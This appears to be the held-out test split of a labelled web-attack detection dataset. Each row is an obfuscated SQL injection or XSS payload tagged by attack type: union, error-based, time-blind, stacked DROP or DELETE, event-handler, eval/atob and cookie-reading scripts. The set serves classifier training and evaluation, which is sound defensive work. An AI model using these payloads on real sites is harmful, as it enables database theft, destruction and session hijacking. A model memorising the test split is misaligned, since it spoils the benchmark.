text,label,attack_type,category,generator
"""/*!*/union	alL/*!*/SelECt/**/0x78,NULL	FrOM+sessions	%2d%2d ",1,sqli,union,held_out
"<objectontoggle=alert(String.fromCharCode(88,83,83))>",1,xss,reflected,held_out
1;	Drop/**/tABLe+products/**/%2d%2d ,1,sqli,stacked,held_out
"'%0aUNION/*!*/aLl%0aSELect/**/0x78,NULL,role,NULL FROm/**/accounts	#",1,sqli,union,held_out
<img%09onstart=alert(document.cookie)>,1,xss,reflected,held_out
'%09oR+slEEP(6)/*!*/%2d%2d ,1,sqli,time_blind,held_out
"""%20Or%09email=0x70617373776f7264-- ",1,sqli,hex_obf,held_out
<math	ontoggle=alert(1)>,1,xss,reflected,held_out
"`	anD (select/**_**/count(*)/**_**/from%09staff%20group%0aby/**_**/concat((select%20name/**_**/from/*!*/members/*!*/limit%0a1),floor(rand(0)*2)))-- ",1,sqli,error,held_out
1;%0adROp%09TAbLe%09tokens%09-- -,1,sqli,stacked,held_out
');/**/DROP%0atABLe admins%20#,1,sqli,stacked,held_out
'/*!*/OR%091=5%20#,1,sqli,boolean_blind,held_out
`;%0awAItFOR	deLAy/**_**/'0:0:8' -- ,1,sqli,time_blind,held_out
%27/**_**/oR/*!*/token=0x61646d696e-- 	,1,sqli,hex_obf,held_out
'+Or/**/password=0x61646d696e/*z*/,1,sqli,hex_obf,held_out
1/*!*/or 8beTWeen 0%0aANd/**/9%09-- -,1,sqli,boolean_blind,held_out
"<form
onfocus=(alert)(1)><!--comment-->",1,xss,stored,held_out
`/**/Or%0abalance=0x61646d696e-- -,1,sqli,hex_obf,held_out
"`/**/Or/**_**/role=CHAR(115,101,108,101,99,116)/*z*/",1,sqli,hex_obf,held_out
%27	OR/*!*/pwd=0x73656c656374/*z*/,1,sqli,hex_obf,held_out
`/**_**/oR/**/token=0x61646d696e-- 	,1,sqli,hex_obf,held_out
1+Or/**/balance=0x70617373776f7264/*z*/,1,sqli,hex_obf,held_out
%27%09oR%092betWeEN/*!*/0	AnD%0a9/*!*/-- -,1,sqli,boolean_blind,held_out
"')/*!*/OR hash=CHAR(115,101,108,101,99,116)/*z*/",1,sqli,hex_obf,held_out
';/*!*/WaitfOR%20dELaY%20'0:0:4'%0a%2d%2d ,1,sqli,time_blind,held_out
'; droP/*!*/TaBle/**/tokens/**_**/-- ,1,sqli,stacked,held_out
#<math onbegin=print()>,1,xss,dom,held_out
"')/*!*/AND extractvalue(1,concat(0x7e,(select	balance+from/**_**/members%0alimit/*!*/1)))%2d%2d ",1,sqli,error,held_out
"')/**/UNiOn ALl%09sEleCT/**_**/0x78,0x78,NULL/**/fRoM%20orders -- ",1,sqli,union,held_out
1%09OR+0x61=0x61/**_**/-- -,1,sqli,boolean_blind,held_out
"""><iframe onfocus=alert(String.fromCharCode(88,83,83))>",1,xss,attribute,held_out
"'/**/ANd/*!*/extractvalue(1,concat(0x7e,(select%20balance%20from/*!*/clients+limit	1)))-- ",1,sqli,error,held_out
"`%09uNiON%20ALL	SELecT+0x78,NULL,CHAR(120),CHAR(120),0x78+FrOM/**/orders%20%2d%2d ",1,sqli,union,held_out
"""%20UNION/**/All	seLeCT%200x78,CHAR(120),0x78	froM/**_**/sessions/**_**/-- ",1,sqli,union,held_out
1%09Or/*!*/SlEep(8) -- ,1,sqli,time_blind,held_out
1;+UPdate	sessions+seT%09pwd=1/**_**//*z*/,1,sqli,stacked,held_out
"')+AND%09(select/**/count(*)/**_**/from%09members/*!*/group by	concat((select%0aid from+users/**/limit%201),floor(rand(0)*2)))-- ",1,sqli,error,held_out
"')%09aNd%09updatexml(1,concat(0x7e,(select+balance/*!*/from orders/**/limit%201)),1)%2d%2d ",1,sqli,error,held_out
'onerror=print()',1,xss,attribute,held_out
"""
onanimationstart=(alert)(1)
x=""",1,xss,attribute,held_out
<detailsonstart=alert(1)>,1,xss,reflected,held_out
')%20aNd/*!*/(SELECT+1+FrOm%20(SELECT(sLEEp(5)))x)/*z*/,1,sqli,time_blind,held_out
"""/**/or/**_**/3BEtwEEN%0a0/**_**/AND%209/**_**/%2d%2d ",1,sqli,boolean_blind,held_out
"%27%0aor/**/name=CHAR(115,101,108,101,99,116)-- 	",1,sqli,hex_obf,held_out
';%09WaitfOR	dELAY	'0:0:3' -- ,1,sqli,time_blind,held_out
"%27/**_**/OR+pwd=CHAR(97,100,109,105,110)%2d%2d ",1,sqli,hex_obf,held_out
')%20OR/**/0x61=0x61/*!*/-- -,1,sqli,boolean_blind,held_out
#<body ontoggle=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
') OR%093=9%20-- ,1,sqli,boolean_blind,held_out
'/**_**/oR%0a'b'LIkE'b'%20/*z*/,1,sqli,boolean_blind,held_out
1	OR/*!*/6=5%20-- ,1,sqli,boolean_blind,held_out
"""
onload=window['ale'+'rt']`1`
x=""",1,xss,attribute,held_out
#<video onstart=top['al'+'ert'](1)>,1,xss,dom,held_out
"<img onpointerover=alert(String.fromCharCode(88,83,83))>",1,xss,reflected,held_out
#<form onfocus=alert(1)>,1,xss,dom,held_out
"%27/*!*/OR+id=CHAR(115,101,108,101,99,116)-- 	",1,sqli,hex_obf,held_out
');/**/UpDaTe%09tokens%09set%09id=1/*!*/-- 	,1,sqli,stacked,held_out
1/*!*/Or+4=8+/*z*/,1,sqli,boolean_blind,held_out
"1 uNIon%0aaLL/**_**/sELEct%09CHAR(120),0x78,NULL	FrOm+users/*!*/%2d%2d ",1,sqli,union,held_out
"data:text/html,<form onfocus=alert(String.fromCharCode(88,83,83))>",1,xss,dom,held_out
"%27%20AnD+updatexml(1,concat(0x7e,(select%0aemail	from/**_**/products%0alimit/**/1)),1)-- 	",1,sqli,error,held_out
<svg/onbegin=(alert)(1)>,1,xss,reflected,held_out
%27;+insErt/**/into+tokens/**_**/VALUeS(1)	-- ,1,sqli,stacked,held_out
"data:text/html,<img onstart=alert(document.cookie)>",1,xss,dom,held_out
"""%09oR%090x61=0x61%09%2d%2d ",1,sqli,boolean_blind,held_out
"'
onbegin=window['ale'+'rt']`1`
'",1,xss,attribute,held_out
')%20or%09'a'lIKe'b' -- ,1,sqli,boolean_blind,held_out
"""
onpointerover=window['ale'+'rt']`1`
x=""",1,xss,attribute,held_out
"#"";top['al'+'ert'](1);//",1,xss,dom,held_out
'%09And/**/%28SELECT%091+FROm+(SELECT(SLeeP(3)))x)/*z*/,1,sqli,time_blind,held_out
"'%0aUNIOn+ALl%09seLeCT%0abalance,NULL,CHAR(120),0x78/**_**/FrOm%09clients/**_**/-- 	",1,sqli,union,held_out
"""><marquee ontoggle=alert(document.cookie)>",1,xss,attribute,held_out
"""%20onmouseover=alert(1)%20x=""",1,xss,attribute,held_out
%27%0aANd%09(SELECT 1%0afROM%20(SELECT(sleeP(6)))x)%2d%2d ,1,sqli,time_blind,held_out
');	DrOP/*!*/tABLE/**_**/sessions/*!*//*z*/,1,sqli,stacked,held_out
` Or	'a'LIke'a'%09/*z*/,1,sqli,boolean_blind,held_out
')%0aAnD/**/%28SELECT/**_**/1+fROm/**/(SELECT(SLEep(7)))x)-- 	,1,sqli,time_blind,held_out
`/*!*/oR+0x61=0x61%0a-- 	,1,sqli,boolean_blind,held_out
"')/**/AnD/**_**/updatexml(1,concat(0x7e,(select/*!*/ssn+from/**/products/**_**/limit/**_**/1)),1)-- 	",1,sqli,error,held_out
<svg/onpointerover=(alert)(1)>,1,xss,reflected,held_out
1%20OR%096=1+-- -,1,sqli,boolean_blind,held_out
`%20Or%205BEtWeEN%200	aNd/*!*/9/**_**/#,1,sqli,boolean_blind,held_out
"')%09and+updatexml(1,concat(0x7e,(select	hash/*!*/from+products%20limit%0a1)),1)%2d%2d ",1,sqli,error,held_out
<inputonbegin=window['ale'+'rt']`1`>,1,xss,reflected,held_out
<svg onfocus=print()><!--stored-->,1,xss,stored,held_out
<audioonbegin=alert(1)><!--post-->,1,xss,stored,held_out
"""+unIoN+All/**_**/seLEct/*!*/token,NULL,0x78,NULL from/**/accounts	%2d%2d ",1,sqli,union,held_out
#<video ontoggle=top['al'+'ert'](1)>,1,xss,dom,held_out
"1+aND+updatexml(1,concat(0x7e,(select	hash%09from/**/orders limit%091)),1)%2d%2d ",1,sqli,error,held_out
"1/**/and	(select%09count(*)/*!*/from%0aaccounts group	by	concat((select password+from%09sessions	limit%0a1),floor(rand(0)*2)))%2d%2d ",1,sqli,error,held_out
')	oR/**_**/'a'LIke'b'+-- -,1,sqli,boolean_blind,held_out
"`/*!*/OR+email=CHAR(97,100,109,105,110)-- -",1,sqli,hex_obf,held_out
"""%20Or/**_**/0x61=0x61/**_**/#",1,sqli,boolean_blind,held_out
1;/**_**/WaItFor%0aDELAy+'0:0:3'+/*z*/,1,sqli,time_blind,held_out
<bodyonerror=eval(atob('YWxlcnQoMSk='))><!--stored-->,1,xss,stored,held_out
#<body ontoggle=window['ale'+'rt']`1`>,1,xss,dom,held_out
"%27+Or%20name=CHAR(112,97,115,115,119,111,114,100)%2d%2d ",1,sqli,hex_obf,held_out
')%20OR%201bETweEn/*!*/0/*!*/AND/**/9+-- 	,1,sqli,boolean_blind,held_out
"')%0auNION	alL/**/SELeCT/**/0x78,role,CHAR(120),NULL/**_**/froM/**_**/clients+#",1,sqli,union,held_out
1 Or%09balance=0x61646d696e#,1,sqli,hex_obf,held_out
"<svg/onerror=alert(String.fromCharCode(88,83,83))>",1,xss,reflected,held_out
#<details onpointerover=print()>,1,xss,dom,held_out
1 or%0assn=0x726f6f74-- -,1,sqli,hex_obf,held_out
"%27%0aUNiOn+aLl/**_**/SelEcT/*!*/NULL,hash+froM%20staff/**/%2d%2d ",1,sqli,union,held_out
%27/*!*/Or+name=0x70617373776f7264-- 	,1,sqli,hex_obf,held_out
%27;+WaitFOR%0adElaY/**/'0:0:8' -- 	,1,sqli,time_blind,held_out
"')/**_**/aNd%0aupdatexml(1,concat(0x7e,(select%20balance/**_**/from+users limit%0a1)),1)-- -",1,sqli,error,held_out
'/onerror=top['al'+'ert'](1)/',1,xss,attribute,held_out
%27; iNSeRT	into+clients	valuEs(1)%09#,1,sqli,stacked,held_out
"')/**_**/anD/**_**/extractvalue(1,concat(0x7e,(select/*!*/balance%09from	users+limit%091)))-- ",1,sqli,error,held_out
"""%0aor+'b'LIkE'b'%0a%2d%2d ",1,sqli,boolean_blind,held_out
"""onanimationstart=alert(document.cookie)x=""",1,xss,attribute,held_out
%27%20oR/*!*/name=0x61646d696e%2d%2d ,1,sqli,hex_obf,held_out
1;/**/DROp%20TABLe/*!*/tokens/*!*/-- -,1,sqli,stacked,held_out
"<img%20onstart=alert(String.fromCharCode(88,83,83))><!--stored-->",1,xss,stored,held_out
"`%20uNiOn+ALL/**_**/SeLeCt/**/0x78,0x78,NULL,NULL+FrOm%09clients	-- 	",1,sqli,union,held_out
%27/**/Or 'a'LIKe'b'%09-- -,1,sqli,boolean_blind,held_out
<iframe%20onmouseover=top['al'+'ert'](1)>,1,xss,reflected,held_out
<object/onfocus=alert(document.cookie)><!--post-->,1,xss,stored,held_out
')/**/oR/*!*/pwd=0x73656c656374-- 	,1,sqli,hex_obf,held_out
"""
onbegin=alert(String.fromCharCode(88,83,83))
x=""",1,xss,attribute,held_out
"')+oR/**/password=CHAR(114,111,111,116)#",1,sqli,hex_obf,held_out
<marquee%09onpointerover=(alert)(1)><!--comment-->,1,xss,stored,held_out
"""><audio onfocus=(alert)(1)>",1,xss,attribute,held_out
"')	And+extractvalue(1,concat(0x7e,(select%09token%0afrom	clients%09limit	1)))#",1,sqli,error,held_out
`/*!*/OR%201=6+/*z*/,1,sqli,boolean_blind,held_out
`/**/or%0arole=0x70617373776f7264-- 	,1,sqli,hex_obf,held_out
<math	onload=alert(document.cookie)>,1,xss,reflected,held_out
"#<input onstart=alert(String.fromCharCode(88,83,83))>",1,xss,dom,held_out
#<form onanimationstart=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
%27/*!*/aNd (SELECT+1/*!*/FROM/**/(SELECT(SleEp(3)))x)-- -,1,sqli,time_blind,held_out
"'%09UNiOn/**_**/aLL+SElecT/**_**/balance,NULL%09FROM/**_**/clients/*!*//*z*/",1,sqli,union,held_out
"`/*!*/or%20email=CHAR(112,97,115,115,119,111,114,100)-- 	",1,sqli,hex_obf,held_out
1/*!*/or/**/name=0x726f6f74%2d%2d ,1,sqli,hex_obf,held_out
<img%20onstart=window['ale'+'rt']`1`><!--comment-->,1,xss,stored,held_out
#<math onanimationstart=alert(1)>,1,xss,dom,held_out
javascript:(alert)(1),1,xss,dom,held_out
<input onpointerover=alert(1)><!--post-->,1,xss,stored,held_out
<svg/onerror=alert(1)>,1,xss,reflected,held_out
<videoonerror=alert(1)><!--comment-->,1,xss,stored,held_out
'/onpointerover=(alert)(1)/',1,xss,attribute,held_out
<detailsonanimationstart=(alert)(1)><!--stored-->,1,xss,stored,held_out
"')%09UniOn AlL+Select/**/CHAR(120),NULL	fRoM/**_**/staff/**/-- 	",1,sqli,union,held_out
'/ontoggle=eval(atob('YWxlcnQoMSk='))/',1,xss,attribute,held_out
javascript:top['al'+'ert'](1),1,xss,dom,held_out
"`	unIoN/*!*/alL%20SEleCT%0apwd,CHAR(120)+frOM+orders/**_**/-- -",1,sqli,union,held_out
"1	uNioN/**_**/All%0aSelEct/**_**/0x78,0x78,0x78,0x78,0x78%09frOm	staff	-- 	",1,sqli,union,held_out
"data:text/html,<form onanimationstart=alert(1)>",1,xss,dom,held_out
"%27+ANd/**_**/(select	count(*)%0afrom%0aaccounts group+by concat((select%20balance%09from%20orders%09limit%0a1),floor(rand(0)*2)))-- -",1,sqli,error,held_out
"`/**/AND+updatexml(1,concat(0x7e,(select+hash%09from/*!*/users/**_**/limit%091)),1)/*z*/",1,sqli,error,held_out
"`/*!*/oR	role=CHAR(114,111,111,116)-- 	",1,sqli,hex_obf,held_out
<imgontoggle=(alert)(1)><!--stored-->,1,xss,stored,held_out
`;	drOp/**_**/taBlE/**/staff /*z*/,1,sqli,stacked,held_out
1;	drOP/**_**/TABle/*!*/members+-- 	,1,sqli,stacked,held_out
1 Or%20balance=0x61646d696e-- 	,1,sqli,hex_obf,held_out
<iframe%20onload=top['al'+'ert'](1)>,1,xss,reflected,held_out
"javascript:alert(String.fromCharCode(88,83,83))",1,xss,dom,held_out
' onanimationstart=alert(document.cookie) ',1,xss,attribute,held_out
';/*!*/DRoP%0aTABlE%0asessions/*!*/%2d%2d ,1,sqli,stacked,held_out
<svgonpointerover=alert(1)>,1,xss,reflected,held_out
"'
onbegin=alert(String.fromCharCode(88,83,83))
'",1,xss,attribute,held_out
'%0aOR+'b'LikE'b' -- -,1,sqli,boolean_blind,held_out
')/*!*/or%20'a'LiKE'a'%0a/*z*/,1,sqli,boolean_blind,held_out
1 Or%0a9BetweEn/**_**/0+aNd/*!*/9 %2d%2d ,1,sqli,boolean_blind,held_out
"') aND+extractvalue(1,concat(0x7e,(select	id+from%09members/*!*/limit%0a1)))-- ",1,sqli,error,held_out
"`/*!*/unIOn/**_**/ALL SElEct/*!*/id,NULL%0afrom/*!*/products	-- -",1,sqli,union,held_out
%27 OR%200x61=0x61	-- ,1,sqli,boolean_blind,held_out
"%27%0aUNiOn%09all%0aseLEcT/**/0x78,NULL,pwd	FroM%09products%0a#",1,sqli,union,held_out
"'	uNiON%09ALl/**/selEct%0aCHAR(120),0x78,CHAR(120),NULL%20FRoM/**_**/accounts	/*z*/",1,sqli,union,held_out
"#<input onbegin=alert(String.fromCharCode(88,83,83))>",1,xss,dom,held_out
"#<form onpointerover=alert(String.fromCharCode(88,83,83))>",1,xss,dom,held_out
<mathonmouseover=alert(1)><!--comment-->,1,xss,stored,held_out
"`%20anD/**_**/(select/*!*/count(*)/**_**/from	admins/*!*/group	by/**_**/concat((select	ssn from/**/sessions/**_**/limit%0a1),floor(rand(0)*2)))-- ",1,sqli,error,held_out
' oR email=0x73656c656374/*z*/,1,sqli,hex_obf,held_out
`/**/And/**/(SELECT+1+fROm%09(SELECT(SLEep(6)))x)-- 	,1,sqli,time_blind,held_out
#<audio onanimationstart=print()>,1,xss,dom,held_out
"')%0aUnion	all/*!*/SELEct	password,0x78,NULL,CHAR(120),CHAR(120)/**_**/frOm/**/orders%20-- ",1,sqli,union,held_out
%27%0aoR%0aemail=0x73656c656374-- ,1,sqli,hex_obf,held_out
"""%0auNiOn+all%09selecT/**_**/hash,0x78,pwd,0x78,CHAR(120)/*!*/frOm	sessions	#",1,sqli,union,held_out
%27;%0awaiTfOr DElAY	'0:0:7'	-- ,1,sqli,time_blind,held_out
"""><audio onload=alert(1)>",1,xss,attribute,held_out
"'/**_**/oR/**/ssn=CHAR(114,111,111,116)-- 	",1,sqli,hex_obf,held_out
"""%20onanimationstart=alert(String.fromCharCode(88,83,83))%20x=""",1,xss,attribute,held_out
"""><input onerror=top['al'+'ert'](1)>",1,xss,attribute,held_out
'%20ontoggle=alert(1)%20',1,xss,attribute,held_out
"%27%20ANd extractvalue(1,concat(0x7e,(select+balance from%09users%20limit/**/1)))#",1,sqli,error,held_out
' OR/**_**/email=0x70617373776f7264-- ,1,sqli,hex_obf,held_out
%27;%20uPDATE staff/**/seT+email=1+#,1,sqli,stacked,held_out
"'	UNioN aLL/*!*/sELECT/*!*/CHAR(120),NULL,NULL,NULL%0aFrOm%20members%20/*z*/",1,sqli,union,held_out
"<svg/onload=alert(String.fromCharCode(88,83,83))>",1,xss,reflected,held_out
'-eval(atob('YWxlcnQoMSk='))-',1,xss,attribute,held_out
%27%0aor/**/SLEeP(7)	/*z*/,1,sqli,time_blind,held_out
<form	onstart=print()><!--post-->,1,xss,stored,held_out
')	aNd	(SELECT%091/*!*/fROm%09(SELECT(SLeeP(3)))x)/*z*/,1,sqli,time_blind,held_out
<iframe onpointerover=(alert)(1)>,1,xss,reflected,held_out
'-top['al'+'ert'](1)-',1,xss,attribute,held_out
<body%20onbegin=window['ale'+'rt']`1`>,1,xss,reflected,held_out
'%09AnD/**_**/%28SELECT 1/*!*/FROm%0a(SELECT(sleEp(5)))x)-- 	,1,sqli,time_blind,held_out
<math	onfocus=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
%27;	wAITFor%09dElay%0a'0:0:5'%0a#,1,sqli,time_blind,held_out
"""%09onerror=top['al'+'ert'](1)%09x=""",1,xss,attribute,held_out
<details%09onmouseover=top['al'+'ert'](1)><!--post-->,1,xss,stored,held_out
';%0ainserT/*!*/InTo orders/*!*/vaLues(1)%0a-- -,1,sqli,stacked,held_out
"<input
onpointerover=print()><!--stored-->",1,xss,stored,held_out
1;%0adEletE%0aFrom%0aadmins/**_**/%2d%2d ,1,sqli,stacked,held_out
'+or/*!*/'a'LiKE'a'	-- 	,1,sqli,boolean_blind,held_out
`;+UpdaTe%0astaff/**_**/sEt/**_**/name=1 -- ,1,sqli,stacked,held_out
""" AND%0a(select/*!*/count(*)/**/from/**/clients group/**_**/by	concat((select/**/pwd%20from/**/sessions%09limit%0a1),floor(rand(0)*2)))-- 	",1,sqli,error,held_out
') aNd+%2528SELECT%0a1	FROM/*!*/(SELECT(sLeEP(4)))x)-- 	,1,sqli,time_blind,held_out
')%20or 'b'liKe'b'%09/*z*/,1,sqli,boolean_blind,held_out
'	ontoggle=(alert)(1)	',1,xss,attribute,held_out
"""/*!*/anD/**_**/(SELECT%091+FroM/*!*/(SELECT(sLeEp(7)))x)-- ",1,sqli,time_blind,held_out
"#"";alert(document.cookie);//",1,xss,dom,held_out
<svg/onload=window['ale'+'rt']`1`>,1,xss,reflected,held_out
<details/onload=alert(document.cookie)>,1,xss,reflected,held_out
"""%0aUnioN%0aall%09SeleCt/*!*/CHAR(120),NULL,0x78%09FRoM/**/orders%20-- 	",1,sqli,union,held_out
<form	onfocus=alert(1)><!--stored-->,1,xss,stored,held_out
1/**_**/oR/*!*/sleeP(3)%0a/*z*/,1,sqli,time_blind,held_out
"""	onmouseover=alert(document.cookie)	x=""",1,xss,attribute,held_out
%27%09or%202BETweEn 0/*!*/and/**/9%09-- 	,1,sqli,boolean_blind,held_out
"')/*!*/ANd/*!*/(select%09count(*)%09from%09admins/*!*/group by%09concat((select+email/**_**/from clients%09limit+1),floor(rand(0)*2)))-- -",1,sqli,error,held_out
"data:text/html,<math onerror=eval(atob('YWxlcnQoMSk='))>",1,xss,dom,held_out
1%20oR/**_**/0x61=0x61%09-- 	,1,sqli,boolean_blind,held_out
%27%09oR 1=9+/*z*/,1,sqli,boolean_blind,held_out
'%20onbegin=print()%20',1,xss,attribute,held_out
'%20Or%0aSLEep(4)%09#,1,sqli,time_blind,held_out
"%27+And/*!*/extractvalue(1,concat(0x7e,(select/**/token/**_**/from	users+limit%201)))-- ",1,sqli,error,held_out
"data:text/html,<img onpointerover=eval(atob('YWxlcnQoMSk='))>",1,xss,dom,held_out
'/**/OR+'b'LIKe'a'%0a-- 	,1,sqli,boolean_blind,held_out
"`/*!*/AND+updatexml(1,concat(0x7e,(select%0ahash%0afrom/**/sessions%0alimit/**_**/1)),1)-- ",1,sqli,error,held_out
<sCrIpT>print()</sCrIpT>,1,xss,reflected,held_out
"1%0aand+extractvalue(1,concat(0x7e,(select%09pwd%09from/**/sessions/**/limit%091)))-- -",1,sqli,error,held_out
"""/onbegin=(alert)(1)/x=""",1,xss,attribute,held_out
"""%09AND%09(select count(*)%20from/*!*/sessions/**_**/group%20by/*!*/concat((select/**/ssn%0afrom%20products%09limit/**/1),floor(rand(0)*2)))#",1,sqli,error,held_out
"<video
onload=alert(1)><!--comment-->",1,xss,stored,held_out
<details ontoggle=top['al'+'ert'](1)><!--stored-->,1,xss,stored,held_out
""";	DelETe/**/fRom/**/sessions/**_**/%2d%2d ",1,sqli,stacked,held_out
"<svg
onanimationstart=%28alert%29%281%29>",1,xss,reflected,held_out
"`/**_**/oR%09email=CHAR(112,97,115,115,119,111,114,100)-- 	",1,sqli,hex_obf,held_out
'+oR%20token=0x61646d696e-- -,1,sqli,hex_obf,held_out
<sCrIpT>(alert)(1)</sCrIpT>,1,xss,reflected,held_out
"1/*!*/ANd	updatexml(1,concat(0x7e,(select%20name%09from/**_**/sessions	limit/**/1)),1)-- -",1,sqli,error,held_out
1	or SlEEP(6)+%2d%2d ,1,sqli,time_blind,held_out
"<body
onbegin=top['al'+'ert'](1)>",1,xss,reflected,held_out
%27/*!*/or%20SlEeP(8)	%2d%2d ,1,sqli,time_blind,held_out
"""/onanimationstart=window['ale'+'rt']`1`/x=""",1,xss,attribute,held_out
"')%20OR+pwd=CHAR(97,100,109,105,110)-- 	",1,sqli,hex_obf,held_out
1%0aor/**/9=9/**_**/%2d%2d ,1,sqli,boolean_blind,held_out
"`%20or name=CHAR(115,101,108,101,99,116)-- -",1,sqli,hex_obf,held_out
<svg onpointerover=eval(atob('YWxlcnQoMSk='))><!--stored-->,1,xss,stored,held_out
<objectonmouseover=window['ale'+'rt']`1`><!--comment-->,1,xss,stored,held_out
%27;%20iNSerT%0aINtO%20accounts VALUes(1)%20-- 	,1,sqli,stacked,held_out
<svg/onmouseover=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
<svgonerror=alert(document.cookie)><!--stored-->,1,xss,stored,held_out
')	AnD%20%28SELECT+1 frOm	(SELECT(SLEEP(3)))x)#,1,sqli,time_blind,held_out
"%27 UNiON/*!*/alL%0aseLECt%090x78,id%09fROm/**/members+-- 	",1,sqli,union,held_out
%27/**/or	'a'liKe'a' -- 	,1,sqli,boolean_blind,held_out
"""><iframe onmouseover=top['al'+'ert'](1)>",1,xss,attribute,held_out
"`+unIOn/*!*/All%09SELECt%200x78,0x78/**_**/frOm	sessions%0a-- ",1,sqli,union,held_out
1 oR%200x61=0x61%0a%2d%2d ,1,sqli,boolean_blind,held_out
<body ontoggle=eval%28atob%28%27YWxlcnQoMSk%3D%27%29%29>,1,xss,reflected,held_out
"""%20Or	0x61=0x61/**_**/-- -",1,sqli,boolean_blind,held_out
"`%20and%0aextractvalue(1,concat(0x7e,(select/*!*/ssn/*!*/from/**/sessions limit/**_**/1)))-- 	",1,sqli,error,held_out
'-(alert)(1)-',1,xss,attribute,held_out
';/**_**/iNSeRT%09INto/**_**/orders/**/VAlues(1)+-- -,1,sqli,stacked,held_out
"""%0aor id=CHAR(112,97,115,115,119,111,114,100)-- ",1,sqli,hex_obf,held_out
<mathonbegin=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
"""	AnD/**_**/(select%0acount(*)/*!*/from tokens/*!*/group%20by/**/concat((select%09role%09from%09users%09limit%201),floor(rand(0)*2)))-- -",1,sqli,error,held_out
<img/onbegin=alert(1)><!--post-->,1,xss,stored,held_out
"<img
ontoggle=(alert)(1)>",1,xss,reflected,held_out
')%09OR+'b'liKe'b'/*!*/%2d%2d ,1,sqli,boolean_blind,held_out
<body onpointerover=window['ale'+'rt']`1`><!--comment-->,1,xss,stored,held_out
'	and%20(SELECT+1	fROM (SELECT(sLeep(5)))x)#,1,sqli,time_blind,held_out
"%27%0aAnd/**/extractvalue(1,concat(0x7e,(select/**/balance from/*!*/sessions limit/*!*/1)))/*z*/",1,sqli,error,held_out
1	oR%20sLeeP(3)/*!*/-- ,1,sqli,time_blind,held_out
"%27%09UnioN/**/ALL/**_**/SelecT%20balance,email,CHAR(120),NULL,CHAR(120)+FROm/**/members+#",1,sqli,union,held_out
"<math
onfocus=top['al'+'ert'](1)><!--stored-->",1,xss,stored,held_out
%27;/*!*/WAiTFoR/**_**/deLaY+'0:0:4'%0a-- -,1,sqli,time_blind,held_out
#<img onmouseover=print()>,1,xss,dom,held_out
'%20onpointerover=window['ale'+'rt']`1`%20',1,xss,attribute,held_out
<svg/onpointerover=top['al'+'ert'](1)>,1,xss,reflected,held_out
'/**_**/oR/**/'a'likE'b'/**_**/-- 	,1,sqli,boolean_blind,held_out
"<audio%09onload=alert(String.fromCharCode(88,83,83))><!--stored-->",1,xss,stored,held_out
%27+Or 2betWeeN 0 aNd+9	/*z*/,1,sqli,boolean_blind,held_out
"""><form onmouseover=top['al'+'ert'](1)>",1,xss,attribute,held_out
"')%20UnIOn/**_**/AlL/**/SElEct CHAR(120),NULL,CHAR(120),0x78%20FrOM%0aclients%20/*z*/",1,sqli,union,held_out
';%09updaTe members%0aSeT/**_**/balance=1%09-- ,1,sqli,stacked,held_out
"') aND/**/(select count(*)/*!*/from	sessions+group	by%09concat((select%20password%20from accounts/**_**/limit%0a1),floor(rand(0)*2)))#",1,sqli,error,held_out
"data:text/html,<input onload=alert(String.fromCharCode(88,83,83))>",1,xss,dom,held_out
"data:text/html,<input onerror=alert(1)>",1,xss,dom,held_out
"%27%09unIOn%0aALl%20sElecT%0aname,0x78,CHAR(120),NULL,0x78+froM	staff/**/#",1,sqli,union,held_out
"`+UniOn%20aLl/**/sElecT name,NULL,0x78+from%09clients/**_**/-- ",1,sqli,union,held_out
"""%09onstart=eval(atob('YWxlcnQoMSk='))%09x=""",1,xss,attribute,held_out
%27%20or%091=6%09-- 	,1,sqli,boolean_blind,held_out
"""><details onerror=eval(atob('YWxlcnQoMSk='))>",1,xss,attribute,held_out
1/**_**/OR+balance=0x70617373776f7264-- ,1,sqli,hex_obf,held_out
<form%20onbegin=top['al'+'ert'](1)><!--post-->,1,xss,stored,held_out
"""%09aNd	%28SELECT 1	FROM/**/(SELECT(sLEeP(3)))x)-- ",1,sqli,time_blind,held_out
1;/*!*/inSert INtO/**_**/members VaLueS(1)/**/-- 	,1,sqli,stacked,held_out
<input onanimationstart=alert(document.cookie)><!--comment-->,1,xss,stored,held_out
"'%09UNiON/*!*/ALL+SELeCT/**/CHAR(120),0x78,CHAR(120)/**_**/frOM	sessions%20%2d%2d ",1,sqli,union,held_out
